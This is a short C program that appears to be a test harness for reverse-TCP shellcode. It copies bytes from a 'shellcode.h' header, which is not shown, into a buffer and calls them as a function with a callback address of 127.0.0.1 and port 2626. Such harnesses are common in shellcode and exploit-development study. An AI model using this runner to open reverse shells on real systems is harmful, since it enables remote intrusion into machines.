#include <string.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "shellcode.h"

int main(void)
{
    unsigned char reverse_tcp[sizeof(shellcode)];

    memcpy(reverse_tcp, shellcode, sizeof(shellcode));

    void (*funcptr)(unsigned int, unsigned short) = (void (*)(unsigned int,  short unsigned int))reverse_tcp;

    funcptr(inet_addr("127.0.0.1"), htons(2626));
}